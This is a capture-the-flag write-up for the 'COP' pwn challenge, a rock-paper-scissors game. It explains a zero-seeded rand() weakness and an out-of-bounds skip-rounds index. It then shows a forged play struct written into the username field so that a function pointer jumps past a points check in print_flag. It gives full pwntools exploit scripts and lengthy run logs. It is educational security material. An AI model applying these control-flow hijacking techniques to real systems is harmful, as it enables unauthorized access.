# COP


The description for this challenge is as follows:

***Hi COP***

*I wrote a game that should be impossible to win.*

*A friend of mine managed to get the flag in a few seconds.*

*Can you help me find out how?*

*Connect: nc cop.ichsa.ctf.today 8011*

*challenge author: Yossef Kuszer*

This was a pwn challenge that was relatively challenging and worth 500 points, with 16 solves in total. The exploitation included a bad seed, some heap-like elements, and COP, or call-oriented programming.

**TL;DR Solution:**  Use the fact that the computer's plays are generated by an unseeded rand() function to win every time. Once you have enough points, use the Skip n Rounds functionality repeatedly to trick the computer into reading its plays from the area where the user's name is stored. Turn on the option to enable ascii art. Then change the username to mimic the structure of the array_of_plays area, but instead of a function pointer to the enable_ascii_art() function, put the address of the print_flag() function directly after the check for whether you have enough points to do this. The flag will automatically be printed.


For some reason, the zip file for this challenge did not come with the actual binary file. Instead, we got chalenge.c, chalenge.h, and a Dockerfile (as well as a very cute gif!). The important lines of the dockerfile are:
```
FROM ubuntu:18.04 as builder
RUN apt update
RUN apt install -y build-essential
WORKDIR /root/
COPY chalenge.c chalenge.h ./
RUN gcc chalenge.c -Os -static -o game
```
If we mimic these steps, we can get a binary file game that should be exactly the same as the one on the live server; I opened up an Ubuntu 18.04 VM and ran the gcc command in the folder where chalenge.c and chalenge.h were stored, but you could probably also use docker. 

The next step is to establish what the program actually does. When we run it, it seems to be a straightforward rock-paper-scissors game. You get a point for each game you win, and you can unlock certain features by winning enough points. The "Print the flag!" option looks interesting, but it seems like it requires an unattainable number of points.
```
knittingirl@piglet:~/CTF/ICHSA_CTF/cop_files$ ./game
+===============================================+
|   Wellcome to my Rock-Paper-Scissors's game   |
+-----------------------------------------------+
| Current score: 
| NOOB player: 0 Points 
| Computer: 0 Points 
+-----------------------------------------------+
| Options:
| 1) Display game rules ------------- (0 Points)
| 2) Play next round ---------------- (0 Points)
| 3) Skip N rounds ------------------ (2 Points)
| 4) Enable Ascii-art --------------- (3 Points)
| 5) Change user name --------------- (5 Points)
| 6) Print the flag! ------- (4294967295 Points)
| 7) Exit --------------------------- (0 Points)
+-----------------------------------------------+
| Please chose an option [2]
+===============================================+
| User input is: 2
+-----------------------------------------------+
| Game #0
+-----------------------------------------------+
| What do you want to do?
| 1) ROCK
| 2) PAPPER
| 3) SCISSORS
+-----------------------------------------------+
| Please chose an option [1]
| Computer chosed: 2
| You chosed: 1
| Point goes to: Computer
+===============================================+
|   Wellcome to my Rock-Paper-Scissors's game   |
+-----------------------------------------------+
| Current score: 
| NOOB player: 0 Points 
| Computer: 1 Points 
+-----------------------------------------------+
| Options:
| 1) Display game rules ------------- (0 Points)
| 2) Play next round ---------------- (0 Points)
| 3) Skip N rounds ------------------ (2 Points)
| 4) Enable Ascii-art --------------- (3 Points)
| 5) Change user name --------------- (5 Points)
| 6) Print the flag! ------- (4294967295 Points)
| 7) Exit --------------------------- (0 Points)
+-----------------------------------------------+
| Please chose an option [ ]
```
When we look at the C source code, there is a section of the init_game() function that reveals how the computer's plays are generated. The rand() function is used, but because the seed is always 0, the numbers it generates will be the same with every run.
```
    srand(0);
    for(uint8_t i = 0; i < ARRAY_OF_PLAYS_MAX_SIZE; i++)
    {
        game_ctx->array_of_plays[i].id = i;
        game_ctx->array_of_plays[i].handsign = (rand() % MAX_HANDSIGNS) + MIN_HANDSIGN;
        game_ctx->array_of_plays[i].animation_function = print_ascii;
    }
```
Also, while you could look at chalenge.h for the values of the globals, looking at the corresponding lines in Ghidra will also show us the exact values of those variables quite easily, and allow us to create a Python script that wins every time.
```
*(int *)(lVar5 + 0x10) = iVar2 % 3 + 1;
} while (lVar4 != 0xaa);
```
Here is the script:
```
from pwn import *

target = remote('cop.ichsa.ctf.today', 8011)

#target = process('./game')

from ctypes import CDLL
from math import *

#I used this one on a Kali machine.
libc = CDLL('libc-2.31.so')
#This one will work on an Ubuntu 18.04
#libc = ELF('libc.so.6')

libc.srand(0)

correct_array = []

for i in range(170):
	rand_num = libc.rand()
	correct_num = rand_num % 3 + 1
	correct_array.append(correct_num)
def play_round(selected_num):
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(b'2')
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(selected_num)

#This will give me enough points to do anything.
for i in range(15):
	comp_choice = correct_array[i]
	if comp_choice == 1:
		play_round(str(2).encode('ascii'))
	elif comp_choice == 2:
		play_round(str(3).encode('ascii'))
	else:
		play_round(str(1).encode('ascii'))


target.interactive()

```
And the results:
```
knittingirl@piglet:~/CTF/ICHSA_CTF/cop_files$ python3 cop_writeup.py 
[+] Opening connection to cop.ichsa.ctf.today on port 8011: Done
b"+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 0 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #0\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 1 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #1\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 2 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #2\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 1\n| You chosed: 2\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 3 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #3\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 4 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #4\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 3\n| You chosed: 1\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 5 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #5\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 6 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #6\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 7 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #7\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 1\n| You chosed: 2\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 8 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #8\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 1\n| You chosed: 2\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 9 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #9\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 10 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #10\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 3\n| You chosed: 1\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 11 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #11\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 12 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #12\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 3\n| You chosed: 1\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 13 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #13\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 14 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #14\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
[*] Switching to interactive mode
| Computer chosed: 3
| You chosed: 1
| Point goes to: NOOB player
+===============================================+
|   Wellcome to my Rock-Paper-Scissors's game   |
+-----------------------------------------------+
| Current score: 
| NOOB player: 15 Points 
| Computer: 0 Points 
+-----------------------------------------------+
| Options:
| 1) Display game rules ------------- (0 Points)
| 2) Play next round ---------------- (0 Points)
| 3) Skip N rounds ------------------ (2 Points)
| 4) Enable Ascii-art --------------- (3 Points)
| 5) Change user name --------------- (5 Points)
| 6) Print the flag! ------- (4294967295 Points)
| 7) Exit --------------------------- (0 Points)
+-----------------------------------------------+
| Please chose an option [$  

```
The next step is definitely what took me the longest on this challenge. Ultimately, the Skip N rounds option is key to the exploit. So, the beginning of the init_game() function looks like this:
```
void init_game()
{
    
    // Allocate some memory for the game_ctx
    game_ctx = mmap(GAME_CTX_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    
    if(game_ctx == NULL)
    {
        printf("Somthing whent wrong while allocation memory for game_ctx, please try again!");
        exit(-1);
    }

    // Set ctx to default values
    memset(game_ctx, 0x0, sizeof(*game_ctx));
    strncpy(game_ctx->player_name, DEFAULT_PLAYER_NAME, sizeof(DEFAULT_PLAYER_NAME));
   
    // Allocate some memory for the game_ctx->array_of_plays
    game_ctx->array_of_plays = mmap(ARRAY_OF_PLAYS_ID, PAGE_SIZE, PROT_WRITE | PROT_READ , MAP_PRIVATE | MAP_ANONYMOUS, -1,0);
    if(game_ctx->array_of_plays == NULL)
    {
        printf("Somthing whent wrong while allocation memory for game_ctx->list_of_plays, please try again!");
        exit(-1);
    }
```
If I run the program in gdb, break at some point after init_game, and use vmmap, I see that something interesting is going on with memory allocation:
```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004d3000 0x0000000000000000 r-x /home/knittingirl/CTF/ICHSA_CTF/cop_files/game
0x00000000006d3000 0x00000000006e9000 0x00000000000d3000 rw- /home/knittingirl/CTF/ICHSA_CTF/cop_files/gam
0x00000000006e9000 0x000000000070d000 0x0000000000000000 rw- [heap]
0x000000c0ffee2000 0x000000c0ffee3000 0x0000000000000000 r-- 
0x000000c0ffeef000 0x000000c0ffef0000 0x0000000000000000 r-- 
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

```
0x000000c0ffee2000 and 0x000000c0ffeef000 are not normal things to see here. Basically, the init_game() allocates these non-standard areas of memory to game_ctx and game_ctx->array_of_plays. The game_ctx->array_of_plays comes first, and then the game_ctx area. The contents of the game_ctx->array_of_plays area in gdb looks like this:
```
gef➤  x/20gx 0x000000c0ffee2000
0xc0ffee2000:	0x0000000000000000	0x0000000000400c1d
0xc0ffee2010:	0x0000000000000002	0x0000000000000001
0xc0ffee2020:	0x0000000000400c1d	0x0000000000000002
```
Based on the C code referenced earlier about the random number population, each entry is 3 qwords long. They include the number of the play, the function pointer to the print_ascii() function, and the 1, 2, or 3 value that the computer will play that round.

Next, the skip_n_rounds function basically lets us move the current play forward. Unfortunately, the size of the rounds_to_skip can only hold a single byte, so we can only skip a maximum of 255 rounds at one time. 
```
bool skip_n_rounds()
{
    bool status = false;
    char input_buffer[INPUT_BUFF_SIZE] = {0};
    uint8_t rounds_to_skip = 0;
    
    do
    {
        if(game_ctx->user_points < POINTS_TO_CHANGE_SKIP_N_ROUNDS)
        {
            printf("| You don't have enouth points for this command\n");
            printf("| You have: %ld but you need at least %u\n",game_ctx->user_points, POINTS_TO_CHANGE_SKIP_N_ROUNDS);
            SET_STATUS_TO_FALSE_AND_BREAK(status)
        }
        

        printf("+-----------------------------------------------+\n");
        printf("| Please chose the number of games to skip [  ]\b\b\b");

		fflush(NULL);

        if(NULL == fgets(input_buffer, INPUT_BUFF_SIZE,stdin))
            SET_STATUS_TO_FALSE_AND_BREAK(status)
        
        if(1 != sscanf(input_buffer, "%hhu" , &rounds_to_skip))
            SET_STATUS_TO_FALSE_AND_BREAK(status)
        
        printf("| You chose to skip %u rounds\n", rounds_to_skip);

        // Check for uint8_t integer overflow
        if(OVERFLOW_CHECK(rounds_to_skip,ARRAY_OF_PLAYS_MAX_SIZE))
            SET_STATUS_TO_FALSE_AND_BREAK(status)
        
        if(game_ctx->current_play + rounds_to_skip > ARRAY_OF_PLAYS_MAX_SIZE)
            SET_STATUS_TO_FALSE_PRINT_AND_BREAK(status, "| Overflow - Not jumping\n")
        
        CHANGE_GAME_CTX_FIELD(current_play, game_ctx->current_play + rounds_to_skip)
        
        status = true;
    }    
    while(false);
    change_permission_game_ctx(false);
    
    return status;
}
```
This function is useful because it actually allows us to skip more rounds than have been stored in the area of memory allocated to game_ctx->array_of_plays. In fact, by chaining the calls to skip_rounds, we can skip right into the area of memory where game_ctx is stored. This takes a total of 250 skips given our limitation of 255 bytes at a time, which took around 1 minute 30 seconds against the server, and which means that skipping to other areas is probably not reasonably achievable. The script to do that is here:
```
for i in range(249):
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(b'3')
	
	print(target.recvuntil(b'Please chose the number of games to skip ['))

	target.sendline(b'255')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'3')
print(target.recvuntil(b'Please chose the number of games to skip ['))
target.sendline(b'150')
```
The structure of game_ctx is defined in the chalenge.h file:
```
struct game_ctx_t
{
    
    uint64_t user_points;
    uint64_t pc_points;
    uint32_t current_play : 12;
    uint32_t ascii_art_enabled : 2;
    //PLAYER_NAME_SIZE is 0x400
    char player_name[PLAYER_NAME_SIZE];
    struct play * array_of_plays;
};
```
The change user name option, then would allow us to write whatever we want in this area that we can trick the computer into thinking is the array_of_plays, and as a result, we can create our own, custom plays. This is really helpful because of a section of the play_next_round() function:
```
 // if ascii art enabled, call function ptr
        if(game_ctx->ascii_art_enabled)
        {
            current_play.animation_function(current_play.handsign, handsig_input);
        }
```
Basically, it is calling the function pointer within the current array_of_plays entry, which we can control. We can call whatever function we want at this point.

The print_flag function obviously seems like it could be useful to call. Its full code is here:
```
bool print_flag()
{
    bool status = false;
    char flag[FLAG_SIZE] = {0};
    char * flag_ptr = NULL;
    FILE *fd = NULL;

    do
    {
        if(game_ctx->user_points < POINTS_TO_PRINT_FLAG)
        {
            printf("| You don't have enouth points for this command\n");
            printf("| You have: %ld but you need at least %u\n",game_ctx->user_points, POINTS_TO_PRINT_FLAG);
            SET_STATUS_TO_FALSE_AND_BREAK(status)
        }
        
        fd = fopen(FLAG_FILE, "r");
        if(fd == NULL)
        {
            printf("| Somthing whent wrong while opeining the file %s\n", FLAG_FILE);
            exit(-1);
        }
        
        flag_ptr = fgets(flag, FLAG_SIZE, fd);
        
        if(flag_ptr == NULL)
        {
            printf("| Somthing whent wrong while reading the file %s\n", FLAG_FILE);
            exit(-1);
        }
        
        printf("| The flag is:%s\n", flag);
        fflush(NULL);
        
        bool status = false;
    }while(false);
    
    return status;
}
```
Unfortunately, we can't just call the function by itself, since it will check if we have enough points to do so. However, when we inspect the function with Ghidra, it looks like we could just jump into the middle of function directly to position where it would jump if we had enough points. It should then print the flag before it hits any errors as a result of this technique. I believe that this is the call-oriented programming, or COP, hinted at by the title:
```
                             LAB_00401813                                    XREF[1]:     004017e3(j)  
        00401813 48 8d 35        LEA        RSI,[DAT_004c117f]                               = 72h    r
                 65 f9 0b 00
        0040181a 48 8d 3d        LEA        RDI,[s_./flag.txt_004adb03]                      = "./flag.txt"
                 e2 c2 0a 00
        00401821 e8 4a 01        CALL       fopen64                                          FILE * fopen64(char * __filename
                 01 00
        00401826 48 85 c0        TEST       RAX,RAX
        00401829 48 8d 15        LEA        RDX,[s_./flag.txt_004adb03]                      = "./flag.txt"
                 d3 c2 0a 00
        00401830 48 8d 35        LEA        RSI,[s_|_Somthing_whent_wrong_while_ope_004adb   = "| Somthing whent wrong while 
                 d7 c2 0a 00
```

The final exploit script where I put all of this together is here:
```
from pwn import *

target = remote('cop.ichsa.ctf.today', 8011)

#target = process('./game')

#conts = '\nc' * 15
#pid = gdb.attach(target, "\nb *play_next_round+405" + conts + "\n set disassembly-flavor intel\ncontinue")

from ctypes import CDLL
from math import *

#I used this one on a Kali machine.
libc = CDLL('libc-2.31.so')
#This one will work on an Ubuntu 18.04
#libc = ELF('libc.so.6')

libc.srand(0)

correct_array = []

for i in range(170):
	rand_num = libc.rand()
	correct_num = rand_num % 3 + 1
	correct_array.append(correct_num)
def play_round(selected_num):
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(b'2')
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(selected_num)

#This will give me enough points to do anything.
for i in range(15):
	comp_choice = correct_array[i]
	if comp_choice == 1:
		play_round(str(2).encode('ascii'))
	elif comp_choice == 2:
		play_round(str(3).encode('ascii'))
	else:
		play_round(str(1).encode('ascii'))

for i in range(249):
	print(target.recvuntil(b'Please chose an option ['))
	target.sendline(b'3')
	
	print(target.recvuntil(b'Please chose the number of games to skip ['))

	target.sendline(b'255')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'3')
print(target.recvuntil(b'Please chose the number of games to skip ['))
target.sendline(b'150')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'4')

print(target.recvuntil(b'Please chose an option ['))
target.sendline(b'5')
print(target.recvuntil(b'Enter your new username'))
#I established this level of padding with gdb and cyclic.
padding = b'a' * (30 - 16)

name = padding
name += p64(100) #Play number, doesn't really matter
name += p64(0x0000000000401813) #The address part-way through flag
name += p64(2) #The computer's selected handsignal, doesn't really matter.
target.sendline(name)

play_round(b'3')

target.interactive()
```
And when I run it, the result looks like this:
```
knittingirl@piglet:~/CTF/ICHSA_CTF/cop_files$ python3 cop_writeup.py
[+] Opening connection to cop.ichsa.ctf.today on port 8011: Done
b"+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 0 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #0\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
b" ]\x08\x08| Computer chosed: 2\n| You chosed: 3\n| Point goes to: NOOB player\n+===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| NOOB player: 1 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #1\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
...
b' ]\x08\x08+===============================================+\n| User input is: 5\n| Enter your new username'
